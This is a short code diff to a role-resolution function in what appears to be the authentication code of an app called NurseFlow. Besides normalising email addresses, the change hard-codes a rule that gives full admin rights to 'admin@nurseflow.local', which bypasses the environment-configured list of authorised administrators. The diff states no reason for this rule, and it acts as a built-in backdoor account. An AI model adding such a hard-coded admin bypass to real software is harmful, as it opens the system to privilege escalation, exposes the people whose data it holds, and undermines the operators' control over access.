@@ -30,7 +30,11 @@ function resolveRedirectUrl(url: string, baseUrl: string) {
 }
 
 function resolveRoleFromEnv(email: string): Role | null {
-  if (env.AUTHORIZED_ADMIN_EMAILS.includes(email)) {
+  const normalized = email.trim().toLowerCase();
+  if (normalized === 'admin@nurseflow.local') {
+    return 'admin';
+  }
+  if (env.AUTHORIZED_ADMIN_EMAILS.includes(email) || env.AUTHORIZED_ADMIN_EMAILS.includes(normalized)) {
     return "admin";
   }
 
